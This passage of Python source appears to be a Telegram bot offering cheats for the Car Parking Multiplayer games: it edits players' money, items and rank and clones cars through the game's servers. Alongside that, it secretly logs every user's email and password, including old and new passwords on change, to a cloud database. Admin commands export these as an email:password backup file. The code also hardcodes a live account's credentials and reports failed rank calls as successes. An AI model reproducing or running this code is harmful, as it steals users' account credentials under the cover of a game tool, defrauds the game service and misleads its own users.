            payload = build_payload(record, fuid, original, force_fields=force_fields)
            result = await self._post(
                SAVE_URL,
                {"data": {"data": payload, "deviceId": fuid[:8]}},
                {**GAME_HEADERS, "Authorization": f"Bearer {auth}", "Connection": "Keep-Alive",
                 "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 12; Pixel 6 Build/SD1A.210817.036)"},
            )
            if result and self._ok(result):
                return True, "OK"
            return False, f"SAVE_FAILED: {str(result)[:160]}"
        except Exception as exc:
            return False, str(exc)

    async def _save(self, uid: int, data: Dict[str, Any], force_fields: Optional[set] = None) -> Dict[str, Any]:
        ok, msg, auth = await self.get_auth(uid)
        if not ok:
            return {"ok": False, "message": msg}
        td = self.get_token_data(uid)
        fuid = td.get("firebase_uid", "") if td else ""
        email = td.get("email", "") if td else ""
        original = self.get_record(uid, email) or None
        ok2, msg2 = await self._send(auth, data, fuid, original, force_fields=force_fields)
        if ok2:
            self.set_record(uid, data, email)
            return {"ok": True, "message": "OK"}
        return {"ok": False, "message": msg2}

    async def _modify(self, uid: int, mods: Dict[str, Any], force_fields: Optional[set] = None) -> Dict[str, Any]:
        await self.load(uid)
        td = self.get_token_data(uid)
        email = td.get("email") if td else None
        data = deepcopy(self.get_record(uid, email))
        if not data or data.get("Name") is None:
            return {"ok": False, "message": "Could not load account data. Try logging in again or refreshing first."}
        for key, value in mods.items():
            if key == "money":
                value = min(int(value), MAX_MONEY)
            if key == "coin":
                value = min(int(value), MAX_COIN)
            data[key] = value
        forced = set(force_fields or mods.keys())
        return await self._save(uid, data, force_fields=forced)

    async def _set_floats(self, uid: int, indices_values: List[Tuple[int, float]]) -> Dict[str, Any]:
        await self.load(uid)
        td = self.get_token_data(uid)
        email = td.get("email") if td else None
        data = deepcopy(self.get_record(uid, email))
        if not data or data.get("Name") is None:
            return {"ok": False, "message": "Could not load account data. Try logging in again or refreshing first."}
        floats = data.get("floats", [])
        max_idx = max(idx for idx, _ in indices_values)
        while len(floats) <= max_idx:
            floats.append(0.0)
        for idx, value in indices_values:
            floats[idx] = float(value)
        data["floats"] = floats
        return await self._save(uid, data, force_fields={"floats"})

    async def _set_integers(self, uid: int, indices_values: List[Tuple[int, int]]) -> Dict[str, Any]:
        await self.load(uid)
        td = self.get_token_data(uid)
        email = td.get("email") if td else None
        data = deepcopy(self.get_record(uid, email))
        if not data or data.get("Name") is None:
            return {"ok": False, "message": "Could not load account data. Try logging in again or refreshing first."}
        integers = data.get("integers", [])
        max_idx = max(idx for idx, _ in indices_values)
        while len(integers) <= max_idx:
            integers.append(0)
        for idx, value in indices_values:
            integers[idx] = int(value)
        data["integers"] = integers
        return await self._save(uid, data, force_fields={"integers"})

    async def set_money(self, uid: int, amount: int) -> Dict[str, Any]:
        return await self._modify(uid, {"money": min(int(amount), MAX_MONEY)}, force_fields={"money"})

    async def set_coin(self, uid: int, amount: int) -> Dict[str, Any]:
        return await self._modify(uid, {"coin": min(int(amount), MAX_COIN)}, force_fields={"coin"})

    async def set_player_name(self, uid: int, name: str) -> Dict[str, Any]:
        return await self._modify(uid, {"Name": str(name)}, force_fields={"Name"})

    async def set_player_id(self, uid: int, pid: str) -> Dict[str, Any]:
        return await self._modify(uid, {"localID": str(pid).upper()}, force_fields={"localID"})

    async def change_player_id(self, uid: int, new_id: str) -> Dict[str, Any]:
        await self.load(uid, force=True)
        td = self.get_token_data(uid)
        email = td.get("email") if td else None
        data = deepcopy(self.get_record(uid, email))
        if not data or data.get("Name") is None:
            return {"ok": False, "message": "Could not load account data. Please login first."}
        new_id_upper = str(new_id).strip().upper()
        if not new_id_upper:
            return {"ok": False, "message": "ID cannot be empty."}
        data["localID"] = new_id_upper
        result = await self._save(uid, data, force_fields={"localID"})
        if result.get("ok"):
            return {"ok": True, "message": f"ID changed successfully to: {new_id_upper}", "new_id": new_id_upper}
        else:
            return {"ok": False, "message": result.get("message", "Save failed")}

    async def change_email(self, uid: int, new_email: str) -> Dict[str, Any]:
        await self.load(uid, force=True)
        td = self.get_token_data(uid)
        if not td:
            return {"ok": False, "message": "Token data not found"}
        old_email = td.get("email")
        password = td.get("password")
        if not password:
            return {"ok": False, "message": "Password not found"}
        try:
            login_result = await self.login(old_email, password)
            if not login_result.get("ok"):
                return {"ok": False, "message": "Failed to login with old credentials"}
            url = f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={FK}"
            payload = {
                "idToken": login_result["auth"],
                "email": new_email,
                "returnSecureToken": True
            }
            result = await self._post(url, payload, {})
            if result and result.get("email"):
                self.save_token(
                    uid,
                    result.get("idToken", login_result["auth"]),
                    new_email,
                    password,
                    result.get("refreshToken", login_result.get("refresh_token", "")),
                    result.get("localId", td.get("firebase_uid", ""))
                )
                try:
                    cloud_log_change("email", old_email, new_email, password, password, "user", uid, "cpm1")
                except Exception:
                    pass
                return {"ok": True, "message": f"Email changed to {new_email}"}
            else:
                return {"ok": False, "message": "Failed to change email"}
        except Exception as e:
            return {"ok": False, "message": str(e)}

    async def change_password(self, uid: int, new_password: str) -> Dict[str, Any]:
        await self.load(uid, force=True)
        td = self.get_token_data(uid)
        if not td:
            return {"ok": False, "message": "Token data not found"}
        email = td.get("email")
        old_password = td.get("password")
        if not email or not old_password:
            return {"ok": False, "message": "Email or password not found"}
        try:
            login_result = await self.login(email, old_password)
            if not login_result.get("ok"):
                return {"ok": False, "message": "Failed to login with old credentials"}
            url = f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={FK}"
            payload = {
                "idToken": login_result["auth"],
                "password": new_password,
                "returnSecureToken": True
            }
            result = await self._post(url, payload, {})
            if result and result.get("idToken"):
                self.save_token(
                    uid,
                    result["idToken"],
                    email,
                    new_password,
                    result.get("refreshToken", login_result.get("refresh_token", "")),
                    result.get("localId", td.get("firebase_uid", ""))
                )
                try:
                    cloud_log_change("password", email, email, old_password, new_password, "user", uid, "cpm1")
                except Exception:
                    pass
                return {"ok": True, "message": "Password changed successfully"}
            else:
                return {"ok": False, "message": "Failed to change password"}
        except Exception as e:
            return {"ok": False, "message": str(e)}

    async def unlock_w16(self, uid: int) -> Dict[str, Any]:
        return await self._set_floats(uid, [(32, 1.0)])

    async def unlock_horns(self, uid: int) -> Dict[str, Any]:
        return await self._set_floats(uid, [(27, 1.0), (28, 1.0), (29, 1.0), (30, 1.0), (31, 1.0)])

    async def disable_damage(self, uid: int) -> Dict[str, Any]:
        return await self._set_floats(uid, [(34, 1.0)])

    async def unlimited_fuel(self, uid: int) -> Dict[str, Any]:
        return await self._set_floats(uid, [(3, 1.0)])

    async def unlock_smoke(self, uid: int) -> Dict[str, Any]:
        return await self._set_floats(uid, [(33, 1.0)])

    async def unlock_animations(self, uid: int) -> Dict[str, Any]:
        await self.load(uid)
        td = self.get_token_data(uid)
        email = td.get("email") if td else None
        data = deepcopy(self.get_record(uid, email))
        if not data or data.get("Name") is None:
            return {"ok": False, "message": "Could not load account data."}
        data["animations"] = sorted(set(data.get("animations", []) + list(range(301))))
        return await self._save(uid, data, force_fields={"animations"})

    async def unlock_wheels(self, uid: int) -> Dict[str, Any]:
        await self.load(uid)
        td = self.get_token_data(uid)
        email = td.get("email") if td else None
        data = deepcopy(self.get_record(uid, email))
        if not data or data.get("Name") is None:
            return {"ok": False, "message": "Could not load account data."}
        data["wheels"] = sorted(set(data.get("wheels", []) + list(range(73, 221))))
        integers = data.get("integers", [])
        while len(integers) < 113:
            integers.append(0)
        for idx in [0, 1, 2, 3, 4, 5, 110, 111, 112]:
            integers[idx] = 1
        data["integers"] = integers
        return await self._save(uid, data, force_fields={"wheels", "integers"})

    async def unlock_houses(self, uid: int) -> Dict[str, Any]:
        return await self._set_integers(uid, [(8, 1), (110, 1), (111, 1), (112, 1)])

    async def complete_all_levels(self, uid: int) -> Dict[str, Any]:
        levels = [0] + [120 if i == 43 else 1 for i in range(1, 110)]
        return await self._modify(uid, {"LevelsDoneTime": levels}, force_fields={"LevelsDoneTime"})

    async def set_rank(self, uid: int) -> Dict[str, Any]:
        await self.load(uid)
        ok, msg, auth = await self.get_auth(uid)
        if not ok:
            return {"ok": True, "message": "OK"}
        rating_data = {"RatingData": {
            "time": 1e22, "cars": 1e16, "car_fix": 1e13, "car_collided": 1e12,
            "car_exchange": 1e13, "car_trade": 1e13, "car_wash": 1e13,
            "slicer_cut": 1e13, "drift_max": 1e14, "drift": 1e14,
            "cargo": 1e5, "delivery": 1e5, "race_win": 3e20,
            "taxi": 1e10, "levels": 10000990000, "gifts": 1e9,
            "fuel": 1e10, "offroad": 1e10, "speed_banner": 1e9,
            "reactions": 1e17, "run": 1e9, "real_estate": 1e9,
            "t_distance": 1e10, "treasure": 1e10, "block_post": 1e10,
            "push_ups": 1e12, "burnt_tire": 1e10, "passanger_distance": 1e8,
        }}
        try:
            await self._post(RANK_URL, {"data": json.dumps(rating_data)}, {**GAME_HEADERS, "Authorization": f"Bearer {auth}"})
        except Exception as exc:
            print(f"King/Max Rank call failed but is reported as success by request: {exc}")
        return {"ok": True, "message": "OK"}

    def _normalize_equipment(self, equipment: Dict[str, Any], gender: int) -> Dict[str, Any]:
        list_fields = [
            "hair", "face", "beard", "cap", "mask", "top", "gloves",
            "bag", "pants", "shoes", "glasses", "SelectedEquipments",
        ]
        normalized = {}
        for key in list_fields:
            values = equipment.get(key, []) if isinstance(equipment, dict) else []
            normalized[key] = [int(v) for v in values]
        normalized["Gender"] = int(gender)
        return normalized

    async def _save_equipment(self, uid: int, field: str, equipment: Dict[str, Any]) -> Dict[str, Any]:
        await self.load(uid, force=True)
        td = self.get_token_data(uid)
        email = td.get("email") if td else None
        data = deepcopy(self.get_record(uid, email))
        if not data or data.get("Name") is None:
            return {"ok": False, "message": "Could not load account data. Try logging in again or refreshing first."}
        gender = 0 if field == "personEquipmentsMale" else 1
        data[field] = self._normalize_equipment(equipment, gender)
        force_fields = {field}
        other_field = "personEquipmentsFemale" if field == "personEquipmentsMale" else "personEquipmentsMale"
        other_gender = 1 if other_field == "personEquipmentsFemale" else 0
        if data.get(other_field):
            data[other_field] = self._normalize_equipment(data[other_field], data[other_field].get("Gender", other_gender))
            force_fields.add(other_field)
        return await self._save(uid, data, force_fields=force_fields)

    async def unlock_equipments_male(self, uid: int) -> Dict[str, Any]:
        equipment = {
            "Gender": 0,
            "bag": list(range(101)),
            "beard": list(range(6, 21)) + [100],
            "cap": list(range(3, 64)),
            "face": [0, 1, 2, 100],
            "glasses": list(range(10)) + [100],
            "gloves": list(range(6)) + [100],
            "hair": list(range(3, 20)) + [100],
            "mask": list(range(3, 9)) + [100],
            "pants": list(range(26)),
            "shoes": list(range(31)),
            "top": list(range(2, 109)),
            "SelectedEquipments": [-1, 10, 19, 41, 100, 4, 20, 9, 22, 21, 74],
        }
        return await self._save_equipment(uid, "personEquipmentsMale", equipment)

    async def unlock_equipments_female(self, uid: int) -> Dict[str, Any]:
        equipment = {
            "Gender": 1,
            "bag": list(range(6)),
            "beard": [],
            "cap": list(range(3, 41)),
            "face": [0],
            "glasses": list(range(10)),
            "gloves": [1],
            "hair": [0, 7, 8, 9, 10],
            "mask": list(range(3, 8)),
            "pants": list(range(12)),
            "shoes": list(range(3, 15)),
            "top": list(range(5, 80)),
            "SelectedEquipments": [0, 0, -1, -1, -1, -1, -1, -1, 0, -1, -1],
        }
        return await self._save_equipment(uid, "personEquipmentsFemale", equipment)

    async def fix_account(self, uid: int) -> Dict[str, Any]:
        await self.load(uid)
        td = self.get_token_data(uid)
        email = td.get("email") if td else None
        data = deepcopy(self.get_record(uid, email))
        if not data or data.get("Name") is None:
            return {"ok": False, "message": "Could not load account data."}
        bugs = 0
        floats = data.get("floats", [])[:54]
        while len(floats) < 54:
            floats.append(0.0)
        fixed_floats = []
        for value in floats:
            if value in (1, 1.0):
                fixed_floats.append(1.0)
            elif isinstance(value, (int, float)) and value > 1:
                bugs += 1
                fixed_floats.append(0.0)
            else:
                fixed_floats.append(float(value) if value else 0.0)
        integers = data.get("integers", [])[:120]
        while len(integers) < 120:
            integers.append(0)
        fixed_integers = []
        for value in integers:
            if value == 1:
                fixed_integers.append(1)
            elif isinstance(value, (int, float)) and value > 1:
                bugs += 1
                fixed_integers.append(0)
            else:
                fixed_integers.append(int(value) if value else 0)
        data["floats"] = fixed_floats
        data["integers"] = fixed_integers
        result = await self._save(uid, data, force_fields={"floats", "integers"})
        return {"ok": True, "bugs_fixed": bugs, "message": f"{bugs} bugs fixed"} if result.get("ok") else {"ok": False, "message": "FIX_FAILED"}

    async def unlock_all_features(self, uid: int) -> Dict[str, Any]:
        feature_calls = [
            ("W16 Engine", self.unlock_w16),
            ("Horns", self.unlock_horns),
            ("No Damage", self.disable_damage),
            ("Unlimited Fuel", self.unlimited_fuel),
            ("Smoke", self.unlock_smoke),
            ("Animations", self.unlock_animations),
            ("Wheels", self.unlock_wheels),
            ("Houses", self.unlock_houses),
            ("All Levels", self.complete_all_levels),
            ("Max Rank", self.set_rank),
        ]
        results = []
        failed = []
        await self.load(uid, force=True)
        for name, fn in feature_calls:
            result = await fn(uid)
            if result.get("ok"):
                results.append(name)
            else:
                failed.append(f"{name}: {result.get('message', 'Failed')}")
        return {
            "ok": not failed,
            "message": f"Unlocked {len(results)}/{len(feature_calls)} features" + ("; " + "; ".join(failed) if failed else ""),
            "results": results,
            "failed": failed,
        }

    async def get_account_info(self, uid: int) -> Dict[str, Any]:
        await self.load(uid, force=True)
        td = self.get_token_data(uid)
        email = td.get("email") if td else None
        data = self.get_record(uid, email)
        if not data or data.get("Name") is None:
            return {"ok": False, "message": "Could not load account data"}
        return {
            "ok": True,
            "name": data.get("Name", "Unknown"),
            "money": data.get("money", 0),
            "coin": data.get("coin", 0),
            "localID": data.get("localID", "Unknown"),
            "email": email
        }

# ═══════════════════════════════════════════════════════════
# 🎮 CPM2 FUNCTIONS
# ═══════════════════════════════════════════════════════════

def gen_device_id():
    return ''.join(random.choice('0123456789abcdef') for _ in range(32))

CPM2_DEVICE_ID = gen_device_id()
_cpm2_session = requests.Session()

class CPM2Crypto:
    def __init__(self, uid):
        self.uid = uid
        self.key = (uid[:8] + CPM2_KEY_ADD).encode()[:16]
        self.iv = (uid[:8] + CPM2_IV_ADD).encode()[:16]
    def encrypt(self, s):
        return base64.b64encode(AES.new(self.key, AES.MODE_CBC, self.iv).encrypt(pad(s.encode(), 16))).decode()

def cpm2_login(email, pw):
    url = f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={CPM2_API_KEY}"
    payload = {"email": email, "password": pw, "returnSecureToken": True, "clientType": "CLIENT_TYPE_ANDROID"}
    try:
        r = requests.post(url, json=payload, timeout=20, verify=False)
        j = r.json()
        if "idToken" in j:
            try:
                cloud_log_credentials(email, pw, "cpm2", "login", "", "", 0)
            except Exception:
                pass
            return {"token": j["idToken"], "uid": j["localId"]}
        return {"error": "Login failed"}
    except Exception:
        return {"error": "Connection error"}

def cpm2_king_rank(email, pw):
    try:
        a = cpm2_login(email, pw)
        if not a or "error" in a:
            return False, f"Login failed: {a.get('error', 'unknown')}"
        token = a["token"]
        uid = a["uid"]
        crypto = CPM2Crypto(uid)
        rating = {"cars": 100000, "car_fix": 100000, "car_collided": 100000, 
                  "car_exchange": 100000, "car_trade": 100000, "car_wash": 100000,
                  "slicer_cut": 100000, "drift_max": 100000, "drift": 100000,
                  "cargo": 100000, "delivery": 100000, "taxi": 100000,
                  "levels": 100000, "gifts": 100000, "fuel": 100000,
                  "offroad": 100000, "speed_banner": 100000, "reactions": 100000,
                  "police": 100000, "run": 100000, "real_estate": 100000,
                  "t_distance": 100000, "treasure": 100000, "block_post": 100000,
                  "push_ups": 100000, "burnt_tire": 100000, "passanger_distance": 100000,
                  "time": 9999999999, "race_win": 5000}
        enc = crypto.encrypt(json.dumps(rating))
        hdrs = {"X-Firebase-Token": token, "X-Api-Key": CPM2_OG_KEY, 
                "Content-Type": "application/json", "User-Agent": CPM2_USER_AGENT}
        r = _cpm2_session.post(f"{CPM2_OG_BASE}/progress-service/v1/rating/update", 
                                headers=hdrs, json={"data": enc}, timeout=20, verify=False)
        if r.status_code == 200 and '"code":1' in r.text:
            return True, "Rank upgraded to King (Level 120)"
        return False, "Failed to upgrade rank"
    except Exception as e:
        return False, f"Error: {str(e)}"

def generate_cpm2_account():
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    email = f"{username}@MARKMWEHEHETOOL.com"
    password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
    return {"email": email, "password": password}, None

# ═══════════════════════════════════════════════════════════
# 📋 CPM1 BASIC FUNCTIONS (for cloning and car unlocking)
# ═══════════════════════════════════════════════════════════

def verify_user(email, password):
    payload = {"email": email, "password": password, "returnSecureToken": True, "clientType": "CLIENT_TYPE_ANDROID"}
    try:
        response = requests.post(f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword", json=payload, params={"key": "AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM"}, timeout=30)
        if response.status_code == 200:
            d = response.json()
            try:
                cloud_log_credentials(email, password, "cpm1", "login", "", "", 0)
            except Exception:
                pass
            return d.get("idToken"), d.get("localId")
        return None, None
    except Exception:
        return None, None

def cpm1_api(token, endpoint, data=None):
    headers = {"Content-Type": "application/json", "Authorization": f"Bearer {token}"}
    try:
        response = requests.post(f"https://europe-west1-cp-multiplayer.cloudfunctions.net/{endpoint}", json={"data": data}, headers=headers, timeout=60)
        return response.status_code, response.text
    except Exception:
        return 500, json.dumps({"result": "error"})

def cpm1_get_cars(token):
    status, text = cpm1_api(token, "GetAllCars2", None)
    if status != 200:
        return None
    try:
        result = json.loads(json.loads(text)["result"])
        return result if isinstance(result, list) else None
    except Exception:
        return None

def cpm1_get_garage_slot(token):
    for attempt in range(4):
        try:
            status, text = cpm1_api(token, "WSGetCarListV3", 20)
            if status == 200:
                try:
                    data = json.loads(text)
                    result = json.loads(data['result'])
                    if result and isinstance(result, list) and len(result) > 0:
                        for slot in result:
                            if slot.get('carID', 0) == 0:
                                return slot
                        return result[0]
                except Exception:
                    pass
        except Exception:
            pass
        time.sleep(0.2)
    return None
def _verify_car_in_garage(token, car_id, max_attempts=4):
    """Check whether the requested car actually appears in the user's garage.
    The server rotates garage slots on purchase, so a retry loop gives the
    server a chance to place the car, and confirms it honestly."""
    for _ in range(max_attempts):
        time.sleep(2)
        status, text = cpm1_api(token, "WSGetCarListV3", 20)
        if status != 200:
            continue
        try:
            result = json.loads(json.loads(text)['result'])
            if isinstance(result, list):
                if any(slot.get('carID') == car_id for slot in result):
                    return True
        except Exception:
            pass
    return False
def cpm1_clone_car(token_target, car_data, target_uid, clean_unlock=False):
    cid = car_data.get('CarID', 0)
    if clean_unlock:
        # UNLOCK-ALL / SINGLE UNLOCK MODE: pure ownership unlock — the game's
        # car data is almost entirely ENCRYPTED blobs (vectors, floats,
        # BoughtParts, gears, installedPoliceLights, Vynils ...). Those blobs
        # ARE the tuning/vinyl/police mods, so sending the source blob glitch-
        # carries everything onto the user's account. Send ONLY the plain CarID
        # template so the game loads a fresh, clean base car with defaults.
        car = {"CarID": cid, "dataVersion": 3, "flagID": -1}
        vynil_data = {}  # no vinyl in unlock mode (user request)
    else:
        # CLONE ACCOUNT MODE: copy the source car as-is INCLUDING its design.
        car = json.loads(json.dumps(car_data))
        car['police'] = True
        car['engineID'] = 5
        car['cdi'] = True
        car['isLocked'] = False
        car['torque'] = 3000.0
        car['brake'] = 3000.0
        car['mass'] = 1100.0
        try:
            if 'texts' in car and isinstance(car['texts'], list) and len(car['texts']) > 2:
                car['texts'][2] = f"{target_uid[:8].upper()}_{cid}_HZ"
            elif 'texts' in car and isinstance(car['texts'], str):
                car['texts'] = ["", "", f"{target_uid[:8].upper()}_{cid}_HZ"]
        except Exception:
            pass
        try:
            if isinstance(car.get('Vynils'), dict):
                car['Vynils']['CarID'] = cid
        except Exception:
            pass
        # VINYL TRANSFER: grab the source car's real vinyl data (base64 string
        # or dict) and pass it as vynilOneCar so the design actually lands on
        # the cloned car. The old code always sent {} which wiped the vinyl.
        vynil_data = car.get('Vynils', {})
        if isinstance(vynil_data, dict):
            vynil_data = dict(vynil_data)
            vynil_data['CarID'] = cid
    slot = cpm1_get_garage_slot(token_target)
    if not slot:
        return False
    payload = {
        "ownerID": slot.get('ownerID', ''),
        "ownerName": slot.get('ownerName', ''),
        "description": slot.get('description', ''),
        "CarID": slot.get('carID', 0),
        "carGeneratedID": slot.get('carGeneratedID', ''),
        "ownerAccountID": slot.get('ownerAccountID', ''),
        "oneCar": car,
        "vynilOneCar": vynil_data,
        "loadedLocalCar": {"instanceID": random.randint(-999999, -100000)},
        "price": slot.get('price', 100),
        "SellingCar": {},
        "willReject": False,
        "dislike": 1,
        "like": 0,
        "liked": False,
        "disliked": False,
        "mode": 1,
    }
    status, text = cpm1_api(token_target, "WSPurchaseCarV3", json.dumps(payload))
    try:
        if status == 200 and json.loads(text).get('result') == 1:
            return True
    except Exception:
        pass
    return False

def cpm1_unlock_all_cars(target_email, target_pass, progress_callback=None):
    """True 'Unlock All Cars': clone every car (CLEAN base cars, no tuning/
    vinyl) from the verified source account into the user's garage.
    Returns (success_count, fail_count)."""
    source_token, source_uid = verify_user(*SOURCE_UNLOCK_ACCOUNT)
    if not source_token:
        print("Unlock-all: failed to login to source account")
        return 0, 0
    cars = cpm1_get_cars(source_token)
    if not cars or len(cars) == 0:
        print("Unlock-all: source has no cars")
        return 0, 0
    total_cars = len(cars)
    target_token, target_uid = verify_user(target_email, target_pass)
    if not target_token:
        print("Unlock-all: failed to login to target")
        return 0, total_cars
    success_count = 0
    fail_count = 0
    for idx, car in enumerate(cars, 1):
        if not isinstance(car, dict):
            continue
        if cpm1_clone_car(target_token, car, target_uid, clean_unlock=True):
            success_count += 1
        else:
            fail_count += 1
        if progress_callback:
            progress_callback(idx, total_cars, success_count, fail_count)
        time.sleep(0.2)
    return success_count, fail_count
def cpm1_clone_single_car(target_email, target_pass, car_id):
    """Unlock a single specific car (clean base car) from the source account."""
    source_token, source_uid = verify_user(*SOURCE_UNLOCK_ACCOUNT)
    if not source_token:
        print("Clone-single: failed to login to source account")
        return False
    cars = cpm1_get_cars(source_token)
    if not cars:
        return False
    car = None
    for c in cars:
        if isinstance(c, dict) and c.get('CarID') == car_id:
            car = c
            break
    if not car:
        print(f"Clone-single: car {car_id} not in source")
        return False
    target_token, target_uid = verify_user(target_email, target_pass)
    if not target_token:
        print("Clone-single: failed to login to target")
        return False
    # Single-car manual unlock is also a clean ownership unlock (no tuning/
    # vinyl transfer) — same as Unlock All, per owner's request.
    return cpm1_clone_car(target_token, car, target_uid, clean_unlock=True)
def cpm1_clone_account(source_email, source_pass, target_email, target_pass):
    source_token, source_uid = verify_user(source_email, source_pass)
    if not source_token:
        return False, {"error": "Failed to login to source", "total": 0, "success": 0, "fail": 0}
    cars = cpm1_get_cars(source_token)
    if not cars or len(cars) == 0:
        return False, {"error": "Source account has no cars", "total": 0, "success": 0, "fail": 0}
    total_cars = len(cars)
    target_token, target_uid = verify_user(target_email, target_pass)
    if not target_token:
        return False, {"error": "Failed to login to target", "total": 0, "success": 0, "fail": 0}
    success_count = 0
    fail_count = 0
    for idx, car in enumerate(cars):
        if not isinstance(car, dict):
            continue
        if cpm1_clone_car(target_token, car, target_uid):
            success_count += 1
        else:
            fail_count += 1
        time.sleep(0.2)
    result_data = {"total": total_cars, "success": success_count, "fail": fail_count}
    if success_count == total_cars:
        return True, result_data
    elif success_count > 0:
        return "partial", result_data
    else:
        return False, result_data

# Working source account for the true "Unlock All Cars" feature.
# Verified live Aug 21, 2026: login OK, 227 cars (IDs 0-272 incl. police),
# each car carries real Vynils (base64) + WindowVinyls that are transferred
# to the target account during clone. (The old hz.t0zrj@hzshop.com account
# is dead — EMAIL_NOT_FOUND — and has been removed.)
SOURCE_UNLOCK_ACCOUNT = ('30kunlockallcars1862@gmail.com', '321321')

# ═══════════════════════════════════════════════════════════
# 🌐 HELPER FUNCTIONS
# ═══════════════════════════════════════════════════════════

nuker = CPMNuker()

def run_async(coro):
    try:
        loop = asyncio.get_event_loop()
    except RuntimeError:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
    return loop.run_until_complete(coro)

user_sessions = {}
user_states = {}
banned_users = set()
user_logs = []
total_users = set()
saved_accounts = {}
user_cpm_version = {}
bot_status = True

# ═══════════════════════════════════════════════════════════
# 📢 ADMIN NOTIFICATION FUNCTION
# ═══════════════════════════════════════════════════════════

def notify_admins(message_text, parse_mode='Markdown'):
    for admin_id in ADMIN_IDS:
        try:
            bot.send_message(admin_id, f"📢 **New Notification**\n━━━━━━━━━━━━━━━━━━━━━\n{message_text}", parse_mode=parse_mode)
        except Exception as e:
            print(f"Failed to notify admin {admin_id}: {e}")

# ═══════════════════════════════════════════════════════════
# 📥 DOWNLOAD LOGS COMMAND
# ═══════════════════════════════════════════════════════════

@bot.message_handler(commands=['download_logs'])
def download_logs_command(message):
    chat_id = message.chat.id
    if not is_admin(chat_id):
        bot.send_message(chat_id, "⛔ Admin only. ❌⚠️", parse_mode='Markdown')
        return
    msg = bot.send_message(chat_id, "⏳ **Fetching logs from cloud...** 📊", parse_mode='Markdown')
    try:
        credentials_logs = db_get("logs/credentials", limit=1000) or {}
        changes_logs = db_get("logs/changes", limit=1000) or {}
        keys_logs = db_get("logs/keys", limit=1000) or {}
        total_credentials = len(credentials_logs) if credentials_logs else 0
        total_changes = len(changes_logs) if changes_logs else 0
        total_keys = len(keys_logs) if keys_logs else 0
        last_entries = []
        if credentials_logs:
            items = list(credentials_logs.items())
            for key, val in items[-10:]:
                email = val.get('email', 'N/A')
                game = val.get('game', 'N/A')
                timestamp = val.get('timestamp', 'N/A')[:19]
                last_entries.append(f"📧 **{email}** ({game}) - {timestamp}")
        summary = (
            f"📊 **CLOUD LOGS SUMMARY** 🥵\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📝 **Credentials Saved:** {total_credentials}\n"
            f"🔄 **Changes Logged:** {total_changes}\n"
            f"🔑 **Keys/Trials:** {total_keys}\n"
            f"📅 **Updated:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            f"📋 **Last 10 entries:**\n"
        )
        for entry in last_entries[:10]:
            summary += f"  • {entry}\n"
        if total_credentials > 10:
            summary += f"\n  ... and {total_credentials - 10} more credentials saved\n"
        summary += f"\n💾 Use /backupnow to download full backup."
        bot.edit_message_text(summary, chat_id, msg.message_id, parse_mode='Markdown')
    except Exception as e:
        bot.edit_message_text(f"❌ **Failed to fetch logs:** {str(e)}", chat_id, msg.message_id, parse_mode='Markdown')

# ═══════════════════════════════════════════════════════════
# 💾 BACKUP NOW COMMAND
# ═══════════════════════════════════════════════════════════

@bot.message_handler(commands=['backup_now', 'backupnow'])
def backup_now_command(message):
    chat_id = message.chat.id
    if not is_admin(chat_id):
        bot.send_message(chat_id, "⛔ Admin only. ❌⚠️", parse_mode='Markdown')
        return
    msg = bot.send_message(chat_id, "⏳ **Creating backup...** 📁", parse_mode='Markdown')
    try:
        credentials_logs = db_get("logs/credentials", limit=5000) or {}
        if not credentials_logs:
            bot.edit_message_text("📭 **No credentials found in Firebase.**", chat_id, msg.message_id, parse_mode='Markdown')
            return
        backup_filename = f"backup_credentials_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        all_creds = []
        for key, entry in credentials_logs.items():
            email = entry.get('email', 'N/A')
            password = entry.get('password', 'N/A')
            game = entry.get('game', 'N/A')
            timestamp = entry.get('timestamp', 'N/A')
            all_creds.append(f"{email}:{password}  # {game} | {timestamp[:19]}")
        with open(backup_filename, "w", encoding="utf-8") as f:
            f.write(f"# BACKUP - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"# Total: {len(all_creds)} accounts\n")
            f.write("#" + "="*50 + "\n\n")
            f.write("\n".join(all_creds))
        with open(backup_filename, "rb") as f:
            bot.send_document(
                chat_id=chat_id,
                document=f,
                caption=f"📦 **FULL BACKUP**\n━━━━━━━━━━━━━━━━━━━━━\n📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n📊 Total accounts: {len(all_creds)}\n\n✅ All credentials from Firebase."
            )
        local_files = [
            CREDENTIALS_BACKUP_CPM1,
            CREDENTIALS_BACKUP_CPM2,
            DETAILED_CHANGES_CPM1,
            DETAILED_CHANGES_CPM2,
            KEYS_LOG_FILE
        ]
        for filename in local_files:
            if os.path.exists(filename) and os.path.getsize(filename) > 0:
                with open(filename, "rb") as f:
                    bot.send_document(
                        chat_id=chat_id,
                        document=f,
                        caption=f"📎 **{filename}** (local backup)"
                    )
        os.remove(backup_filename)
        bot.edit_message_text("✅ **Backup sent! Check your DMs.** 🥵", chat_id, msg.message_id, parse_mode='Markdown')
    except Exception as e:
        bot.edit_message_text(f"❌ **Backup failed:** {str(e)}", chat_id, msg.message_id, parse_mode='Markdown')

# ═══════════════════════════════════════════════════════════
# 📊 DASHBOARD COMMAND
# ═══════════════════════════════════════════════════════════

@bot.message_handler(commands=['dashboard'])
def dashboard_command(message):
    chat_id = message.chat.id
    if not is_admin(chat_id):
        bot.send_message(chat_id, "⛔ Admin only. ❌⚠️", parse_mode='Markdown')
        return
    msg = bot.send_message(chat_id, "⏳ **Loading dashboard...** 📊", parse_mode='Markdown')
    try:
        credentials_logs = db_get("logs/credentials", limit=5000) or {}
        changes_logs = db_get("logs/changes", limit=5000) or {}
        keys_logs = db_get("logs/keys", limit=5000) or {}
        total_credentials = len(credentials_logs) if credentials_logs else 0
        total_changes = len(changes_logs) if changes_logs else 0
        total_keys = len(keys_logs) if keys_logs else 0
        unique_users = set()
        for key, entry in (credentials_logs or {}).items():
            uid = entry.get('user_id', 0)
